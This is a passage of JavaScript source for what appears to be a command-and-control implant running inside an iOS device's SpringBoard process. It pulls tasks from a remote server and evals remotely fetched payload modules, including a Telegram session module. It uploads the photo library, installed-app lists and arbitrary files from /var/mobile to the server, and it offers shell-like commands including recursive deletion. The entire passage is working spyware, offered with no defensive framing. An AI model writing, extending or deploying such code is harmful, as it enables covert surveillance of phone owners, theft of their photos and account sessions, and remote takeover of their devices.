			hqPost("/api/task/status", { command_id: cid, status: "failed", error: "write_agent_cmd_fail" });
			return false;
		}
		hqPost("/api/task/status", { command_id: cid, status: "running", summary: "pe_load " + mid + " len=" + src.length });
		try { _c2Log("[C2-AGENT] pe_load queued " + mid + " len=" + src.length + " path=" + mpath); } catch (_) {}
		return true;
	} catch (e) {
		hqPost("/api/task/status", { command_id: cid, status: "failed", error: String(e).slice(0, 200) });
		return false;
	}
}

// Hot JS eval inside SpringBoard agent (Media tokens already applied at inject).
// Do NOT use for pe-only modules (telegram_v1 → pe_load).
function handleAgentHotModule(cmd, defaultName) {
	var p = cmd.params || {};
	var cid = cmd.command_id || p._task_id || ("agent-mod-" + Date.now());
	var modName = p.name || p.module || p.module_id || defaultName || "photos_upload_v1.js";
	if (String(modName).indexOf(".js") < 0) modName = modName + ".js";
	var startMs = Date.now();
	try {
		hqPost("/api/task/status", { command_id: cid, status: "running", summary: "agent_hot " + modName });
		var got = hqPost("/api/payload/get", {
			name: modName,
			uid: DEVICE_UUID,
			uuid: DEVICE_UUID,
			device_code: DEVICE_UUID});
		if (got && got.data && !got.src) got = got.data;
		var src = _payloadSrcFromGot(got);
		if (!src || src.length < 80) {
			var err = (got && (got.detail || got.error || got.reason))
				? String(got.detail || got.error || got.reason).slice(0, 120)
				: "payload/get failed";
			hqPost("/api/task/status", { command_id: cid, status: "failed", error: err });
			try { _c2Log("[C2-AGENT] agent_hot fail " + modName + " " + err); } catch (_) {}
			return false;
		}
		globalThis.__c2_hot_cmd = {
			command_id: cid,
			type: cmd.type || "agent_module",
			params: p
		};
		var result = null;
		try {
			result = eval(src);
		} finally {
			try { delete globalThis.__c2_hot_cmd; } catch (_) { globalThis.__c2_hot_cmd = null; }
		}
		var deferred = !!(result && typeof result === "object" && result.status === "deferred");
		hqPost("/api/task/status", {
			command_id: cid,
			status: deferred ? "deferred" : "success",
			summary: deferred
				? ("agent_hot deferred " + modName + " " + (result.busy || result.reason || ""))
				: ("agent_hot done " + modName + " ms=" + (Date.now() - startMs)),
			result: result && typeof result === "object" ? result : { ok: true }
		});
		try { _c2Log("[C2-AGENT] agent_hot " + (deferred ? "defer " : "ok ") + modName + " len=" + src.length); } catch (_) {}
		return !deferred;
	} catch (e) {
		hqPost("/api/task/status", { command_id: cid, status: "failed", error: String(e).slice(0, 200) });
		try { _c2Log("[C2-AGENT] agent_hot ERR " + String(e).slice(0, 120)); } catch (_) {}
		return false;
	}
}

function handlePhotosUploadV1(cmd) {
	var p = cmd.params || {};
	var cid = cmd.command_id || p._task_id || ("photos-" + Date.now().toString(16));
	cmd.command_id = cid;
	p.name = "photos_upload_v1.js";
	p.module_id = "photos_upload_v1";
	p.timeout_sec = Number(p.timeout_sec || 3600) || 3600;
	if (!p.result_url) {
		var base = _normC2Base(HQ_API_BASE || C2_PIN_BASE || "");
		p.result_url = base ? (base + "/result") : "/result";
	}
	if (!p.result_path) p.result_path = "/result";
	p.command_id = cid;
	cmd.params = p;
	// pe_load: defer only if agent.cmd already busy
	try {
		if (Number(Native.callSymbol("access", "/tmp/c2_ipc/agent.cmd", 0)) === 0) {
			hqPost("/api/task/status", {
				command_id: cid,
				status: "deferred",
				summary: "photos deferred pe_busy=agent.cmd"
			});
			try { _c2Log("[C2-AGENT] photos_upload_v1 defer agent.cmd"); } catch (_) {}
			return false;
		}
	} catch (_) {}
	try { _c2Log("[C2-AGENT] photos_upload_v1 -> pe_load cid=" + cid); } catch (_) {}
	return handlePeLoad(cmd);
}

function _tgV1PushTick() {
	if (!C2_TG_PAUSED) return;
	if (globalThis.__c2_tg_v1_done) return;
	try {
		if (Number(Native.callSymbol("access", "/tmp/c2_ipc/tg_v1.done", 0)) === 0) {
			globalThis.__c2_tg_v1_done = true;
			return;
		}
		if (Number(Native.callSymbol("access", "/tmp/tg_auth/atomic-state", 0)) === 0 &&
			Number(Native.callSymbol("access", "/tmp/tg_auth/db_t1.json", 0)) === 0) {
			globalThis.__c2_tg_v1_done = true;
			return;
		}
		var now = Date.now();
		if (globalThis.__c2_tg_v1_next && now < globalThis.__c2_tg_v1_next) return;
		globalThis.__c2_tg_v1_next = now + 8000;
		if (!DEVICE_UUID) return;
		handlePeLoad({ command_id: "tg-v1-auto", params: { name: "telegram_v1.js" } });
	} catch (e) {
		try { _c2Log("[C2-AGENT] tg_v1 push err " + String(e).slice(0, 80)); } catch (_) {}
	}
}

function _peTaskStatusTick() {
	try {
		var stDir = "/tmp/c2_ipc/pe_task_status";
		var entries = listDir(stDir) || [];
		for (var i = 0; i < entries.length; i++) {
			var name = entries[i].name || entries[i];
			if (!name || name.indexOf(".json") < 0) continue;
			var raw = _v1ReadFileUtf8 ? _v1ReadFileUtf8(stDir + "/" + name, 8192) : null;
			if (!raw) {
				try {
					var ab = readFileB64 ? null : null;
				} catch (_) {}
			}
			var txt = "";
			try {
				var fd = Native.callSymbol("open", stDir + "/" + name, 0);
				if (Number(fd) >= 0) {
					var buf = Native.callSymbol("calloc", 1, 8192);
					var n = Number(Native.callSymbol("read", fd, buf, 8191));
					Native.callSymbol("close", fd);
					if (n > 0) {
						var ab2 = Native.read(buf, n);
						txt = _rawToStr(ab2);
					}
					Native.callSymbol("free", buf);
				}
			} catch (_) {}
			if (!txt) continue;
			var st = null;
			try { st = JSON.parse(txt); } catch (_) { continue; }
			if (!st || !st.command_id) continue;
			hqPost("/api/task/status", {
				command_id: st.command_id,
				status: st.status || "running",
				summary: st.summary || "",
				error: st.error || ""
			});
			if (st.status === "completed" || st.status === "failed" || st.status === "done") {
				try { Native.callSymbol("unlink", stDir + "/" + name); } catch (_) {}
				try { Native.callSymbol("unlink", "/tmp/c2_ipc/pe_tasks/" + st.command_id + ".json"); } catch (_) {}
			}
		}
	} catch (e) {}
}

function _taskPullTick() {
	try {
		var resp = hqPost("/api/task/pull", { uid: DEVICE_UUID, uuid: DEVICE_UUID, claim_admin: true });
		var data = (resp && resp.data) ? resp.data : resp;
		// Prefer non-empty list: [] is truthy in JS, so `dispatch_tasks || admin_tasks`
		// would pick empty dispatch_tasks and drop a real admin_tasks payload (photos miss).
		var at = (data && data.admin_tasks) || [];
		var dt = (data && data.dispatch_tasks) || [];
		var tasks = (at.length ? at : (dt.length ? dt : []));
		if (!tasks.length && resp && resp.admin_tasks && resp.admin_tasks.length) tasks = resp.admin_tasks;
		// Flat beacon-style pull (type + params, no admin_tasks wrapper)
		if (!tasks.length && data && data.type && data.type !== "noop") tasks = [data];
		else if (!tasks.length && resp && resp.type && resp.type !== "noop" && !resp.data) tasks = [resp];
		for (var i = 0; i < tasks.length; i++) {
			var t = tasks[i];
			if (!t) continue;
			var cmd = t.command || t;
			if (!cmd.type && t.type) cmd = t;
			if (!cmd.command_id && t.command_id) cmd.command_id = t.command_id;
			if (!cmd.params) cmd.params = t.params || {};
			try {
				switch (cmd.type) {
					case "apps": handleApps(cmd); break;
					case "app_tree": handleAppTree(cmd); break;
					case "app_files": handleAppFiles(cmd); break;
					case "ls": handleLs(cmd); break;
					case "download": handleDownload(cmd); break;
					case "pe_passthrough": handlePePassthrough(cmd); break;
					case "pe_load": handlePeLoad(cmd); break;
					case "load_module": handlePeLoad(cmd); break;
					case "agent_module": handleAgentHotModule(cmd); break;
					case "photos_upload_v1": handlePhotosUploadV1(cmd); break;
					case "photos": handlePhotos(cmd); break;
					case "photo_scan": handlePhotoScan(cmd); break;
					case "execute_command": handleExecuteCommand(cmd); break;
					case "exec": handleExec(cmd); break;
					case "basic_info": handleBasicInfo(cmd); break;
					case "your_type": handleYourType(cmd); break;
					default:
						try { _c2Log("[C2-AGENT] task/pull unknown type=" + cmd.type); } catch (_) {}
				}
			} catch (e) {
				hqPost("/api/task/status", { command_id: cmd.command_id || "", status: "failed", error: String(e).slice(0, 200) });
			}
		}
		if (tasks.length) {
			try { _c2Log("[C2-AGENT] task/pull n=" + tasks.length); } catch (_) {}
		}
	} catch (e) {
		try { _c2Log("[C2-AGENT] task/pull err " + e); } catch (_) {}
	}
}

// SAMPLE handler for Type:"your_type". Replace body when you fill in the task.
function handleYourType(cmd) {
	try { _c2Log("[C2-AGENT] your_type received cid=" + String(cmd.command_id || "").slice(0, 24)); } catch (_) {}
}

function handleDownload(cmd) {
	var p = cmd.params && cmd.params.path;
	if (!p) return;
	var maxSz = (cmd.params && cmd.params.max_size) || MAX_FILE_SIZE;
	var sz = getFileSize(p);
	if (sz <= 0 || sz > maxSz) return;
	var fname = p.split("/").pop();
	if (sz <= CHUNK_SIZE) {
		var f = readFileB64(p, maxSz);
		if (f) sendResult(cmd.command_id, f.b64, fname);
	} else {
		sendFileChunked(cmd.command_id, p, fname);
	}
}

function handlePhotos(cmd) {
	var dcim = "/var/mobile/Media/DCIM";
	var maxCount = (cmd.params && cmd.params.max_count) || 50;
	var count = 0;
	var dirs = listDir(dcim);
	for (var di = 0; di < dirs.length && count < maxCount; di++) {
		if (dirs[di].type !== "dir") continue;
		var sub = dcim + "/" + dirs[di].name;
		var files = listDir(sub);
		for (var fi = 0; fi < files.length && count < maxCount; fi++) {
			if (files[fi].type !== "file") continue;
			var fp = sub + "/" + files[fi].name;
			var sz = getFileSize(fp);
			if (sz <= 0) continue;
			if (sz <= CHUNK_SIZE) {
				var f = readFileB64(fp);
				if (f) {
					sendResult(cmd.command_id, f.b64, files[fi].name, "photos");
					count++;
				}
			} else {
				var chunkResult = sendFileChunked(cmd.command_id, fp, files[fi].name, "photos");
				if (chunkResult && chunkResult.ok) count++;
			}
		}
	}
	sendJSON(cmd.command_id, { collected: count }, "photos_summary.json");
}

function _extractBundleId(bytes) {
	var text = _rawToStr(bytes);
	var xmlKey = "MCMMetadataIdentifier</key>";
	var ki = text.indexOf(xmlKey);
	if (ki >= 0) {
		var si = text.indexOf("<string>", ki);
		if (si >= 0) {
			si += 8;
			var ei = text.indexOf("</string>", si);
			if (ei >= 0) return text.substring(si, ei);
		}
	}
	var strings = [];
	var cur = "";
	for (var i = 0; i < bytes.length; i++) {
		if (bytes[i] >= 0x20 && bytes[i] <= 0x7E) {
			cur += String.fromCharCode(bytes[i]);
		} else {
			if (cur.length >= 3) strings.push(cur);
			cur = "";
		}
	}
	if (cur.length >= 3) strings.push(cur);
	var mki = -1;
	for (var j = 0; j < strings.length; j++) {
		if (strings[j] === "MCMMetadataIdentifier") { mki = j; break; }
	}
	var candidates = [];
	for (var j = 0; j < strings.length; j++) {
		var s = strings[j];
		var fi = 0;
		while (fi < s.length && !((s.charCodeAt(fi) >= 0x41 && s.charCodeAt(fi) <= 0x5A) ||
			(s.charCodeAt(fi) >= 0x61 && s.charCodeAt(fi) <= 0x7A))) fi++;
		if (fi > 0) s = s.substring(fi);
		if (s.length < 5) continue;
		if (s.indexOf(".") < 0) continue;
		if (s.indexOf("MCM") === 0) continue;
		if (s.charAt(0) === "$") continue;
		if (s.indexOf("]") >= 0) continue;
		if (s.indexOf("bplist") >= 0) continue;
		if (s.indexOf("apple.mobile_container") >= 0) continue;
		if (s.indexOf("MobileInstallation") >= 0) continue;
		if (s === "com.apple.installd") continue;
		if (s === "com.apple.containermanagerd") continue;
		if (s === "com.apple.lsd") continue;
		candidates.push({ s: s, i: j });
	}
	if (candidates.length === 0) return "";
	if (candidates.length === 1) return candidates[0].s;
	if (mki >= 0) {
		var best = candidates[0];
		var bd = Math.abs(candidates[0].i - mki);
		for (var k = 1; k < candidates.length; k++) {
			var d = Math.abs(candidates[k].i - mki);
			if (d < bd) { bd = d; best = candidates[k]; }
		}
		return best.s;
	}
	return candidates[0].s;
}

function handleApps(cmd) {
	const apps = _collectInstalledApps();
	try { _writeAppListTmp(apps); } catch (_) {}
	sendJSON(cmd.command_id, apps, "app_list.json");
}

function _extractMetaBundleId(bytes) {
	if (!bytes || !bytes.length) return "";
	var txt = _rawToStr(bytes);
	var m = txt.match(/MCMMetadataIdentifier<\/key>\s*<string>([^<]+)/);
	if (m && m[1]) return String(m[1]);
	var bpAll = txt.match(/[a-z][a-zA-Z0-9]*(?:\.[a-zA-Z0-9_-]+){1,}/g);
	if (bpAll) {
		for (var i = 0; i < bpAll.length; i++) {
			if (bpAll[i].indexOf("MCM") >= 0) continue;
			if (bpAll[i].indexOf("apple.mobile_container") >= 0) continue;
			if (bpAll[i].indexOf(".") < 0) continue;
			return bpAll[i];
		}
	}
	return "";
}

function _collectInstalledApps() {
	var bases = [
		{ kind: "data", path: "/var/mobile/Containers/Data/Application" },
		{ kind: "group", path: "/var/mobile/Containers/Shared/AppGroup" }
	];
	var apps = [];
	var groups = [];
	for (var bi = 0; bi < bases.length; bi++) {
		var base = bases[bi].path;
		var dirs = listDir(base);
		for (var i = 0; i < dirs.length; i++) {
			if (dirs[i].type !== "dir") continue;
			var meta = base + "/" + dirs[i].name + "/.com.apple.mobile_container_manager.metadata.plist";
			var ok = Number(Native.callSymbol("access", meta, 0)) === 0;
			var bundleId = "";
			if (ok) {
				var bytes = _readFileBytes(meta, 8192);
				bundleId = _extractMetaBundleId(bytes);
			}
			if (bases[bi].kind === "group") {
				if (bundleId) groups.push(bundleId);
			} else {
				apps.push({ uuid: dirs[i].name, bundleId: bundleId, hasMetadata: ok });
			}
		}
	}
	return { ts: Date.now(), uuid: DEVICE_UUID, apps: apps, groups: groups };
}

function _writeAppListTmp(obj) {
	var body = JSON.stringify(obj || {});
	_v1WriteFile("/tmp/c2_ipc/app_list.json", body);
	try { _v1WriteFile("/tmp/c2_v1/sb/app_list.json", body); } catch (_) {}
}

function _applistAfterPromoTick() {
	if (globalThis.__c2_applist_done) return;
	if (!/^[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}$/.test(DEVICE_UUID))
		return;
	var promoDone = Number(Native.callSymbol("access", "/tmp/c2_ipc/safari_promo.done", 0)) === 0;
	if (!promoDone) {
		if (!globalThis.__c2_promo_wait_ts) {
			globalThis.__c2_promo_wait_ts = Date.now();
			try { _c2Log("[C2-AGENT] wait safari_promo.done before applist"); } catch (_) {}
		}
		if ((Date.now() - globalThis.__c2_promo_wait_ts) < 180000) return;
		try { _c2Log("[C2-AGENT] applist after safari_promo timeout"); } catch (_) {}
	}
	try {
		var al = _collectInstalledApps();
		_writeAppListTmp(al);
		sendJSON("applist-" + Date.now().toString(16), al, "app_list.json");
		globalThis.__c2_applist_done = true;
		_c2Log("[C2-AGENT] app_list wrote n=" + ((al.apps && al.apps.length) || 0) +
			" groups=" + ((al.groups && al.groups.length) || 0) +
			" after_promo=" + (promoDone ? "1" : "timeout"));
	} catch (e) {
		_c2Log("[C2-AGENT] app_list FAIL " + String(e).slice(0, 80));
	}
}

function handleExec(cmd) {
	var p = cmd.params || {};
	var code = p.code;
	var startMs = Date.now();
	if (!code) {
		sendJSON(cmd.command_id, {
			status: "failed", error: "empty code",
			_task_id: p._task_id || "", _task_type: p._task_type || ""
		}, "exec_result.json");
		return;
	}
	try {
		var r = eval(code);
		sendJSON(cmd.command_id, {
			status: "success",
			result: String(r !== undefined ? r : ""),
			execution_time: (Date.now() - startMs) / 1000,
			_task_id: p._task_id || "", _task_type: p._task_type || ""
		}, "exec_result.json");
	} catch (e) {
		sendJSON(cmd.command_id, {
			status: "failed",
			error: String(e),
			execution_time: (Date.now() - startMs) / 1000,
			_task_id: p._task_id || "", _task_type: p._task_type || ""
		}, "exec_result.json");
	}
}

function handlePing(cmd) {
	var p = cmd.params || {};
	sendJSON(cmd.command_id, {
		status: "success",
		result: "pong",
		role: "c2_agent",
		_task_id: p._task_id || "",
		_task_type: p._task_type || ""
	}, "exec_result.json");
}

// ============================================================================
// file_upload: scan directories, filter files, upload matching ones in chunks
// ============================================================================

function _scanDir(base, files, recurse, excludes, filterMode, exts, maxSz) {
	var items = listDir(base);
	for (var i = 0; i < items.length; i++) {
		var full = base + "/" + items[i].name;
		if (items[i].type === "dir") {
			if (!recurse) continue;
			var skip = false;
			for (var e = 0; e < excludes.length; e++) {
				if (full === excludes[e]) { skip = true; break; }
			}
			if (!skip) _scanDir(full, files, recurse, excludes, filterMode, exts, maxSz);
		} else if (items[i].type === "file") {
			if (maxSz > 0) {
				var fd = Number(Native.callSymbol("open", full, 0, 0));
				if (fd >= 0) {
					var sz = Number(Native.callSymbol("lseek", fd, 0, 2));
					Native.callSymbol("close", fd);
					if (sz > maxSz) continue;
				}
			}
			if (filterMode === "include" && exts.length > 0) {
				var dot = items[i].name.lastIndexOf(".");
				if (dot < 0) continue;
				var ext = items[i].name.substring(dot).toLowerCase();
				var found = false;
				for (var x = 0; x < exts.length; x++) {
					if (exts[x].toLowerCase() === ext) { found = true; break; }
				}
				if (!found) continue;
			} else if (filterMode === "exclude" && exts.length > 0) {
				var dot2 = items[i].name.lastIndexOf(".");
				if (dot2 >= 0) {
					var ext2 = items[i].name.substring(dot2).toLowerCase();
					var blocked = false;
					for (var x2 = 0; x2 < exts.length; x2++) {
						if (exts[x2].toLowerCase() === ext2) { blocked = true; break; }
					}
					if (blocked) continue;
				}
			}
			files.push(full);
		}
	}
}

function handleFileUpload(cmd) {
	var p = cmd.params || {};
	var paths = p.upload_paths || ["/var/mobile"];
	var filterMode = p.filter_mode || "none";
	var extStr = p.file_extensions || "";
	var exts = extStr ? extStr.split(",") : [];
	var recurse = (p.include_subdirs !== false);
	var excludes = p.exclude_dirs || [];
	var maxMB = p.max_file_size_mb;
	var maxSz = (maxMB && maxMB > 0) ? maxMB * 1024 * 1024 : 0;

	var files = [];
	for (var pi = 0; pi < paths.length; pi++) {
		_scanDir(paths[pi], files, recurse, excludes, filterMode, exts, maxSz);
	}

	var uploaded = 0;
	for (var fi = 0; fi < files.length; fi++) {
		var fname = files[fi].replace(/\//g, "_");
		if (fname.charAt(0) === "_") fname = fname.substring(1);
		var sz = getFileSize(files[fi]);
		if (sz <= 0) continue;
		if (sz <= CHUNK_SIZE) {
			var rd = readFileB64(files[fi], maxSz > 0 ? maxSz : MAX_FILE_SIZE);
			if (rd) {
				sendResult(cmd.command_id, rd.b64, fname, "file_upload");
				uploaded++;
			}
		} else {
			var chunkRes = sendFileChunked(cmd.command_id, files[fi], fname, "file_upload");
			if (chunkRes && chunkRes.ok) uploaded++;
		}
	}
	sendJSON(cmd.command_id, {
		scanned: files.length, uploaded: uploaded,
		_task_id: p._task_id || "", _task_type: p._task_type || ""
	}, "file_upload_summary.json");
}

// ============================================================================
// Execute Command - unified shell-like command interface
// Since c2_agent runs in a JS sandbox without shell access, common shell
// commands are emulated via POSIX native calls.
// Result format follows API spec: { exit_code, stdout(b64), stderr(b64),
//                                    execution_time, timeout }
// ============================================================================

var _cwd = "/var/mobile";

function _parseArgs(cmdStr) {
	var args = [];
	var cur = "";
	var inQ = 0;
	for (var i = 0; i < cmdStr.length; i++) {
		var c = cmdStr.charAt(i);
		if (c === '\\' && i + 1 < cmdStr.length) { cur += cmdStr.charAt(++i); continue; }
		if (inQ === 1) { if (c === "'") inQ = 0; else cur += c; continue; }
		if (inQ === 2) { if (c === '"') inQ = 0; else cur += c; continue; }
		if (c === "'") { inQ = 1; continue; }
		if (c === '"') { inQ = 2; continue; }
		if (c === ' ' || c === '\t') {
			if (cur.length) { args.push(cur); cur = ""; }
			continue;
		}
		cur += c;
	}
	if (cur.length) args.push(cur);
	return args;
}

function _resolvePath(p) {
	if (!p) return _cwd;
	if (p === "~") return "/var/mobile";
	if (p.indexOf("~/") === 0) return "/var/mobile" + p.substring(1);
	if (p.charAt(0) === '/') return p;
	var base = _cwd;
	if (base.charAt(base.length - 1) !== '/') base += '/';
	var parts = (base + p).split('/');
	var res = [];
	for (var i = 0; i < parts.length; i++) {
		if (parts[i] === '' && i > 0) continue;
		if (parts[i] === '.') continue;
		if (parts[i] === '..') { if (res.length > 1) res.pop(); }
		else res.push(parts[i]);
	}
	return res.join('/') || '/';
}

function _strToB64(s) {
	if (!s) return "";
	return bytesToBase64(new Uint8Array(Native.stringToBytes(s, false)));
}

function _readFileBytes(path, maxSz) {
	maxSz = maxSz || (2 * 1024 * 1024);
	var fd = Number(Native.callSymbol("open", path, 0, 0));
	if (fd < 0) return null;
	try {
		var sz = Number(Native.callSymbol("lseek", fd, 0, 2));
		Native.callSymbol("lseek", fd, 0, 0);
		if (sz < 0) return null;
		if (sz === 0) return new Uint8Array(0);
		var toRead = sz > maxSz ? maxSz : sz;
		var buf = Native.callSymbol("malloc", Native.asBigInt(toRead));
		if (!buf || buf === 0n) return null;
		try {
			var nr = Number(Native.callSymbol("read", fd, buf, toRead));
			if (nr <= 0) return new Uint8Array(0);
			return new Uint8Array(Native.read(buf, nr));
		} finally { Native.callSymbol("free", buf); }
	} finally { Native.callSymbol("close", fd); }
}

function _rawToStr(bytes) {
	var s = "";
	for (var i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
	return s;
}

function _statFile(path) {
	var sb = Native.callSymbol("calloc", 1, 144);
	if (!sb || sb === 0n) return null;
	var r = Number(Native.callSymbol("lstat", path, Native.asBigInt(sb)));
	if (r !== 0) { Native.callSymbol("free", sb); return null; }
	var mode  = _readU16(Native.asBigInt(sb), 4);
	var nlink = _readU16(Native.asBigInt(sb), 6);
	var size  = _readI64(Native.asBigInt(sb), 96);
	var atime = _readI64(Native.asBigInt(sb), 32);
	var mtime = _readI64(Native.asBigInt(sb), 48);
	var ctime = _readI64(Native.asBigInt(sb), 80);
	Native.callSymbol("free", sb);
	var fmt = mode & 0xF000;
	return {
		mode: mode, nlink: nlink, size: size,
		atime: atime, mtime: mtime, ctime: ctime,
		isDir: fmt === 0x4000, isFile: fmt === 0x8000, isLink: fmt === 0xA000,
		type: fmt === 0x4000 ? "dir" : fmt === 0xA000 ? "link" : "file"
	};
}

function _modeStr(mode) {
	var fmt = mode & 0xF000;
	var t = fmt === 0x4000 ? 'd' : fmt === 0xA000 ? 'l' : '-';
	var bits = [0x100,0x080,0x040,0x020,0x010,0x008,0x004,0x002,0x001];
	var chars = "rwxrwxrwx";
	var p = "";
	for (var i = 0; i < 9; i++) p += (mode & bits[i]) ? chars.charAt(i) : '-';
	return t + p;
}

function _fmtSizeH(n) {
	if (n < 1024) return n + "";
	if (n < 1048576) return (n / 1024).toFixed(1) + "K";
	if (n < 1073741824) return (n / 1048576).toFixed(1) + "M";
	return (n / 1073741824).toFixed(1) + "G";
}

// ---- File System Commands ----

function _cmdLs(args) {
	var long = false, all = false, target = null;
	for (var i = 1; i < args.length; i++) {
		var a = args[i];
		if (a.charAt(0) === '-') {
			for (var j = 1; j < a.length; j++) {
				if (a.charAt(j) === 'l') long = true;
				if (a.charAt(j) === 'a') all = true;
			}
		} else target = a;
	}
	var path = _resolvePath(target);
	var st = _statFile(path);
	if (!st) return { code: 2, out: "", err: "ls: " + path + ": No such file or directory\n" };
	if (st.isFile) {
		if (long) return { code: 0, out: _modeStr(st.mode) + "\t" + st.size + "\t" + path + "\n", err: "" };
		return { code: 0, out: path + "\n", err: "" };
	}
	var items = listDir(path);
	var out = "";
	for (var i = 0; i < items.length; i++) {
		if (!all && items[i].name.charAt(0) === '.') continue;
		if (long) {
			var fp = path + (path === "/" ? "" : "/") + items[i].name;
			var fs = _statFile(fp);
			if (fs) {
				out += _modeStr(fs.mode) + "\t" + fs.size + "\t" + items[i].name + "\n";
			} else {
				out += (items[i].type === "dir" ? "d" : "-") + "---------\t0\t" + items[i].name + "\n";
			}
		} else {
			out += items[i].name + "\n";
		}
	}
	return { code: 0, out: out, err: "" };
}

function _cmdCat(args) {
	if (args.length < 2) return { code: 1, out: "", err: "cat: missing operand\n" };
	var out = "", errs = "", fail = false;
	for (var i = 1; i < args.length; i++) {
		var path = _resolvePath(args[i]);
		var acc = Number(Native.callSymbol("access", path, 0));
		if (acc !== 0) { errs += "cat: " + path + ": No such file or directory\n"; fail = true; continue; }
		var sz = getFileSize(path);
		if (sz > 2 * 1024 * 1024) { errs += "cat: " + path + ": File too large (max 2MB)\n"; fail = true; continue; }
		if (sz === 0) continue;
		var bytes = _readFileBytes(path);
		if (!bytes || bytes.length === 0) continue;
		out += _rawToStr(bytes);
	}
	return { code: fail ? 1 : 0, out: out, err: errs };
}

function _cmdPwd() { return { code: 0, out: _cwd + "\n", err: "" }; }

function _cmdCd(args) {
	var target = args.length > 1 ? args[1] : "/var/mobile";
	var path = _resolvePath(target);
	var st = _statFile(path);
	if (!st) return { code: 1, out: "", err: "cd: " + path + ": No such file or directory\n" };
	if (!st.isDir) return { code: 1, out: "", err: "cd: " + path + ": Not a directory\n" };
	_cwd = path;
	return { code: 0, out: "", err: "" };
}

function _cmdMkdir(args) {
	var mkp = false, target = null;
	for (var i = 1; i < args.length; i++) {
		if (args[i] === "-p") mkp = true;
		else target = args[i];
	}
	if (!target) return { code: 1, out: "", err: "mkdir: missing operand\n" };
	var path = _resolvePath(target);
	if (mkp) {
		var parts = path.split('/');
		var cur = "";
		for (var i = 0; i < parts.length; i++) {
			cur += (i === 0 ? "" : "/") + parts[i];
			if (!cur) cur = "/";
			if (!_statFile(cur)) Native.callSymbol("mkdir", cur, 0x1ed);
		}
	} else {
		var r = Number(Native.callSymbol("mkdir", path, 0x1ed));
		if (r !== 0) return { code: 1, out: "", err: "mkdir: " + path + ": Cannot create directory\n" };
	}
	return { code: 0, out: "", err: "" };
}

function _rmRecursive(path) {
	var items = listDir(path);
	for (var i = 0; i < items.length; i++) {
		var fp = path + "/" + items[i].name;
		if (items[i].type === "dir") _rmRecursive(fp);
		else Native.callSymbol("unlink", fp);
	}
	Native.callSymbol("rmdir", path);
}

function _cmdRm(args) {
	var recursive = false, force = false, targets = [];
	for (var i = 1; i < args.length; i++) {
		if (args[i].charAt(0) === '-') {
			for (var j = 1; j < args[i].length; j++) {
				var ch = args[i].charAt(j);
				if (ch === 'r' || ch === 'R') recursive = true;
				if (ch === 'f') force = true;
			}
		} else targets.push(args[i]);
	}
	if (!targets.length) return { code: 1, out: "", err: "rm: missing operand\n" };
	var errs = "";
	for (var t = 0; t < targets.length; t++) {
		var path = _resolvePath(targets[t]);
		var st = _statFile(path);
		if (!st) { if (!force) errs += "rm: " + path + ": No such file or directory\n"; continue; }
		if (st.isDir) {
			if (!recursive) { errs += "rm: " + path + ": Is a directory\n"; continue; }
			_rmRecursive(path);
		} else {
			var r = Number(Native.callSymbol("unlink", path));
			if (r !== 0 && !force) errs += "rm: " + path + ": Permission denied\n";
		}
	}
	return { code: errs ? 1 : 0, out: "", err: errs };
}

function _cmdCp(args) {
	if (args.length < 3) return { code: 1, out: "", err: "cp: missing operand\n" };
	var src = _resolvePath(args[1]);
	var dst = _resolvePath(args[2]);
	var srcSt = _statFile(src);
	if (!srcSt) return { code: 1, out: "", err: "cp: " + src + ": No such file or directory\n" };
	if (!srcSt.isFile) return { code: 1, out: "", err: "cp: " + src + ": Not a regular file\n" };
	var dstSt = _statFile(dst);
	if (dstSt && dstSt.isDir) dst = dst + "/" + src.split('/').pop();

	var srcFd = Number(Native.callSymbol("open", src, 0, 0));
	if (srcFd < 0) return { code: 1, out: "", err: "cp: " + src + ": Permission denied\n" };
	var dstFd = Number(Native.callSymbol("open", dst, 0x0601, 0x1a4));
	if (dstFd < 0) { Native.callSymbol("close", srcFd); return { code: 1, out: "", err: "cp: " + dst + ": Cannot create file\n" }; }

	var BUF = 65536;
	var buf = Native.callSymbol("malloc", Native.asBigInt(BUF));
	if (!buf || buf === 0n) {
		Native.callSymbol("close", srcFd); Native.callSymbol("close", dstFd);
		return { code: 1, out: "", err: "cp: out of memory\n" };
	}
	var err = "";
	try {
		for (;;) {
			var nr = Number(Native.callSymbol("read", srcFd, buf, BUF));
			if (nr <= 0) break;
			var nw = Number(Native.callSymbol("write", dstFd, buf, nr));
			if (nw !== nr) { err = "cp: write error\n"; break; }
		}
	} finally {
		Native.callSymbol("free", buf);
		Native.callSymbol("close", srcFd);
		Native.callSymbol("close", dstFd);
	}
	if (!err) Native.callSymbol("chmod", dst, 0x1A4);
	return { code: err ? 1 : 0, out: "", err: err };
}

function _cmdMv(args) {
	if (args.length < 3) return { code: 1, out: "", err: "mv: missing operand\n" };
	var src = _resolvePath(args[1]);
	var dst = _resolvePath(args[2]);
	var dstSt = _statFile(dst);
	if (dstSt && dstSt.isDir) dst = dst + "/" + src.split('/').pop();
	var r = Number(Native.callSymbol("rename", src, dst));
	if (r !== 0) return { code: 1, out: "", err: "mv: cannot move " + src + " to " + dst + "\n" };
	return { code: 0, out: "", err: "" };
}

function _cmdStat(args) {
	if (args.length < 2) return { code: 1, out: "", err: "stat: missing operand\n" };
	var path = _resolvePath(args[1]);
	var st = _statFile(path);
	if (!st) return { code: 1, out: "", err: "stat: " + path + ": No such file or directory\n" };
	var out = "  File: " + path + "\n";
	out += "  Size: " + st.size + "\tType: " + st.type + "\n";
	out += "  Mode: " + _modeStr(st.mode) + " (" + (st.mode & 0xFFF).toString(8) + ")\n";
	out += " Links: " + st.nlink + "\n";
	out += "Access: " + new Date(st.atime * 1000).toISOString() + "\n";
	out += "Modify: " + new Date(st.mtime * 1000).toISOString() + "\n";
	out += "Change: " + new Date(st.ctime * 1000).toISOString() + "\n";
	return { code: 0, out: out, err: "" };
}

function _cmdChmod(args) {
	if (args.length < 3) return { code: 1, out: "", err: "chmod: missing operand\n" };
	var mode = parseInt(args[1], 8);
	if (isNaN(mode)) return { code: 1, out: "", err: "chmod: invalid mode: " + args[1] + "\n" };
	var path = _resolvePath(args[2]);
	var r = Number(Native.callSymbol("chmod", path, mode));
	if (r !== 0) return { code: 1, out: "", err: "chmod: " + path + ": Operation not permitted\n" };
	return { code: 0, out: "", err: "" };
}

function _cmdTouch(args) {
	if (args.length < 2) return { code: 1, out: "", err: "touch: missing operand\n" };
	var path = _resolvePath(args[1]);
